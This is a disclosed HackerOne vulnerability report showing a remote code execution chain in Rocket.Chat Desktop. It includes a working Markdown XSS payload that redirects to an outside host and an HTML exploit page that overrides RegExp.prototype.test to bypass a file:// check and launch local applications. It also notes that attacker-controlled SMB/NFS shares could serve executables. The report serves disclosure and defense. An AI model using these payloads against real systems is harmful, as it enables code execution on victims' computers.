# Remote Code Execution in Rocket.Chat Desktop

## Report Details
- **Report ID**: 276031
- **URL**: https://hackerone.com/reports/276031
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-10-10T06:22:44.191Z
- **Disclosed**: 2018-09-18T22:00:43.878Z

## Reporter
- **Username**: mattaustin
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rocket_chat

## Vulnerability Information
**Summary:** The Markdown parser can be tricked into allowing arbitrary Javascript leading to "remote code execution". 

**Description:** 
By combining the "link" and inline code block we can trick the parser into breaking out of the current HTML attribute. 

This allows us to control other attributes of the tag and trigger javascript events. 
```
[ hax ](http://hax//onmouseover=location='https://maustin.net/hax/rocket/hack.html';"`hax`zzz)
```
becomes 
```html
<a href="&lt;a href=" http:="" hax="" onmouseover="location='https://maustin.net/hax/rocket/hack.html';&quot;&quot;" target="_blank" rel="noopener noreferrer">
```

This is a simple redirect to: https://maustin.net/hax/rocket/hack.html

From this point the goal is to get the application to call shell.openExternal(href); with a URL we control. Thats because: 
>      "open 'file://localhost/Volumes/Macintosh HD/foo.txt'" opens the document
     in the default application for its type (as determined by LaunchSer-
     vices).

Note:  For this demo I point to file:///Applications/Calculator.app however if you point to a public NFS or SMB server on windows this executable can be controlled by the attacker. (example at: file:///net/192.241.239.91/var/nfs/general/hack2.app)

In https://github.com/RocketChat/Rocket.Chat.Electron/blob/master/src/public/preload.js#L45 all links are hooked and some patter matching is used to check before firing them off to shell.openExternal(href); 

Normally preload javascript is an "isolated scope" in this case however the code is directly attached to the user controlled DOM as the "window.onload" handler. This means we can overload some global objects and methods including the RegExp.prototype.test method. Now we can bypass the file:\\/\\/ check send our application path to openExternal.

```html
<!DOCTYPE html>
<html>
    <head>
      <script>
        RegExp.prototype.test = new Proxy(RegExp.prototype.test, {
          apply: function(target, thisArg, argumentsList) {
            console.log(thisArg.source);
          console.log(argumentsList[0]);
          if((thisArg.source == '^file:\\/\\/.+') && (argumentsList[0] === 'file:///Applications/Calculator.app')){
            return false;
          }
          return Reflect.apply(target, thisArg, argumentsList)
          }
        });
        setTimeout(()=>{
            a = document.createElement("A")
            a.href="file:///Applications/Calculator.app"
            document.body.appendChild(a)
            a.click()
        }, 3000);
      </script>
    </head>
    <body>
     <h1>3...2...1...🚀</h1>
    </body>
</html>
```

## Releases Affected:

  * >= 2.9.0

## Steps To Reproduce (from initial installation to vulnerability):

  1. Create a new channel to test in. 
  1. Send the following snippet of markdown: 
```
[ hax ](http://hax//onmouseover=location='https://maustin.net/hax/rocket/hack.html';"`hax`zzz)
```
  1. Move your mouse over the link you just send and 

## Supporting Material/References:

  * https://youtu.be/HPlwlc2J-LQ

## Suggested mitigation

  * The markdown parser needs a little love to prevent the initial xss. 
  * I believe you should be able to use something like  `window.addEventListener("load",` .. to execute the checks in the proper scope. 


## Attachments
No attachments
